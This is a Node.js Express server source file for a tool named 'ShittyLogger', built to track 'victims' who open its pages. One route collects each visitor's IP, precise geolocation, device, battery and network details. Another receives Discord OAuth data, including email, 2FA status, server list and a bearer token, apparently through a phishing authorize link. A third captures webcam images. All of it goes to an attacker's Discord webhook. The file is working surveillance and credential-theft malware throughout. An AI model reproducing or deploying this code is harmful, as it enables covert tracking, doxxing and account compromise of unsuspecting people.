const express = require('express')
const app = express()
const { fetch, FetchResultTypes, FetchMethods } = require('@sapphire/fetch');
const { webhookURL, token, httpsConf, port } = require('./config.json');
const { MessageEmbed, WebhookClient } = require('discord.js');
const webhook = new WebhookClient({ url: webhookURL });
let canUseWidget = true;
let visitedIPs = [], visitedDiscords = [];
var parser = require('ua-parser-js');
const fs = require('fs').promises;
const fs2 = require('fs');
var privateKey, certificate;
if (httpsConf) {
  privateKey = fs2.readFileSync(httpsConf.privateKey);
  certificate = fs2.readFileSync(httpsConf.certificate);
}
const https = require('https');

app.get('/log', async (req, res) => {
  const ip = req.ip.split(':').pop();
  if (visitedIPs.includes(ip) || !req.get('User-Agent'))
    return res.sendStatus(202);
  const data = await ipInfo(ip, canUseWidget)
  if (data.bogon)
    return res.sendStatus(202);
  var ua = parser(req.get('User-Agent'));
  let embed = new MessageEmbed()
  	.setTitle('A victim visited ShittyLogger!')
  	.setColor('#0099ff')
    .addFields(
  		{ name: 'IP', value: data.ip, inline: true },
  		{ name: 'City', value: data.city, inline: true },
      { name: 'Region', value: data.region, inline: true },
      { name: 'Country', value: `:flag_${data.country.toLowerCase()}: ${data.country}`, inline: true },
      { name: 'Coordinates', value: `${data.loc} ([Google Maps](http://maps.google.com/maps?z=3&t=m&q=loc:${data.loc.split(',')[0]}+${data.loc.split(',')[1]}))`, inline: true },
      { name: 'Timezone', value: data.timezone, inline: true },
      { name: 'OS', value: `${ua.os.name || "<Unknown>"} ${ua.os.version || ""}`, inline: true },
      { name: 'Device', value: `${Object.values(ua.device).filter(k => ua.device[k] === undefined).join(' ')}\u200B`, inline: true },
      { name: 'Browser', value: `${ua.browser.name || "<Unknown>"} ${ua.browser.version || "<Unknown>"}`, inline: true },
      { name: "Browser's engine", value: `${ua.engine.name} ${ua.engine.version}`, inline: true },
      { name: 'CPU', value: `${(Object.values(ua.cpu).filter(k => k !== undefined) || "<Unknown>".split('<')).join(' ')}\u200B`, inline: true },
      { name: 'User-Agent', value: `\`${ua.ua}\``, inline: true },
      { name: 'Network type :test_tube:', value: req.query.network, inline: true },
      { name: 'Internet speed :test_tube:', value: `${req.query.speed} Mbits/s (${req.query.speed / 8} Mbytes/s)`, inline: true },
      { name: 'Battery :test_tube:', value: req.query.battery, inline: true },
      { name: "Browser's language", value: req.query.language, inline: true },
  	);
  if (data.asn) {
    embed.addFields(
      { name: 'Provider', value: `${data.asn.name} (${data.asn.domain})`, inline: true },
      { name: 'Anonymity', value: `${Object.keys(data.privacy).filter(k => data.privacy[k] === true)}\u200B`, inline: true }
    )
    if (data.company)
      embed.addField('Company', `${data.company.name} (${data.company.domain})`, true);
    if (data.carrier)
      embed.addField('Carrier', data.carrier.name, true);
  } else
    embed.addField('Possible provider', data.org, true);
  if (data.postal)
    embed.addField('Postal code', data.postal, true);
  if (data.hostname)
    embed.addField('Hostname', data.hostname, true);
  if (data.abuse) {
    embed.addFields(
      { name: "Provider's building address", value: `${data.abuse.address}\u200B`, inline: true },
      { name: "Name of the provider's building", value: `${data.abuse.name}\u200B`, inline: true },
      { name: "Provider's e-mail", value: `${data.abuse.email}\u200B`, inline: true },
      { name: "Provider's phone number", value: `${data.abuse.phone}\u200B`, inline: true }
    )
  }
  if (data.domains) {
    if (data.domains.total != 0) {
      let domains = '';
      for (const domain of data.domains.domains) {
        domains += `${domain} `
      }
      embed.addField(`Domains (${data.domains.total})`, `${domains}\u200B`)
    }
  }
  webhook.send({ embeds: [embed] });
  res.sendStatus(204);
  visitedIPs = visitedIPs.concat(ip);
})

app.use(express.static('static'));
app.use(express.json({ limit: '50mb' }));

app.post('/discord', async (req, res) => { // https://discord.com/oauth2/authorize?client_id=973159483188609054&redirect_uri=http%3A%2F%2Fgohoski.fvds.ru%2F&response_type=token&scope=identify%20guilds%20email
  if (visitedDiscords.includes(req.body.id))
    return res.sendStatus(202);
  req.body.locale ||= 'white';
  let embed = new MessageEmbed()
  	.setTitle('Someone logged into Discord!')
  	.setColor('#47ff4d')
    .addFields(
      { name: 'Id', value: req.body.id, inline: true },
      { name: 'Username', value: `${req.body.username}#${req.body.discriminator}`, inline: true },
      { name: 'Has two-factor authentication?', value: `${req.body.mfa_enabled}\u200B`, inline: true },
      { name: 'Client language', value: `:flag_${req.body.locale}: ${req.body.locale.toUpperCase()}`, inline: true },
      { name: 'Verified?', value: `${req.body.verified}\u200B`, inline: true },
      { name: 'E-mail', value: req.body.email, inline: true },
      { name: 'Temporary Bearer token', value: `||${req.query.accessToken}||
Please note that you cannot fully login with this token into the account, but you can only view the info listed above`, inline: true },
      { name: 'Servers', value: 'Attachment', inline: true })
    .setThumbnail(`https://cdn.discordapp.com/avatars/${req.body.id}/${req.body.avatar}.webp`);
  await fs.writeFile('guilds.json', JSON.stringify(req.body.guilds, null, 2))
  webhook.send({
    embeds: [embed],
    files: [{
      attachment: './guilds.json',
      name: 'guilds.json'
    }]
  });
  res.sendStatus(204);
  visitedDiscords = visitedDiscords.concat(req.body.id)
})

app.post('/webcam', async (req, res) => {
  await fs.writeFile('out.png', req.body.img, 'base64');
  webhook.send({
    content: "**Victim's webcam pic!**",
    files: [{
      attachment: './out.png',
      name: 'victimCam.png'
    }]
  });
  res.status(204).send();
})

if (httpsConf) {
  https.createServer({
      key: privateKey,
      cert: certificate
  }, app).listen(port, () => {
    console.log(`ShittyLogger has been started with SSL on port ${port}`)
  });
} else
  app.listen(port, () => {
    console.log(`ShittyLogger has been started on port ${port}`);
  });

async function ipInfo(ip, widget) {
  canUseWidget = widget;
  if (canUseWidget) {
    try {
      return await fetch(`https://ipinfo.io/widget/${ip}`, {
    		method: FetchMethods.Get,
    		headers: {
    			Referer: 'https://ipinfo.io/',
          Host: 'ipinfo.io',
          Connection: 'keep-alive',
          'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_x64; rv:93.0) Gecko/20100101 Firefox/93.0'
    		}
    	}, FetchResultTypes.JSON);
    } catch {
      console.warn('Got ratelimited for using the widget, will use the token-based API for the next 12 hours.');
      setTimeout(() => {
        canUseWidget = true;
        console.warn('Will try use the widget API now.');
      }, 4.32e+7);
      return await ipInfo(ip, false);
    }
  } else {
    return await fetch(`https://ipinfo.io/${ip}?token=${token}`, FetchResultTypes.JSON);
  }
}
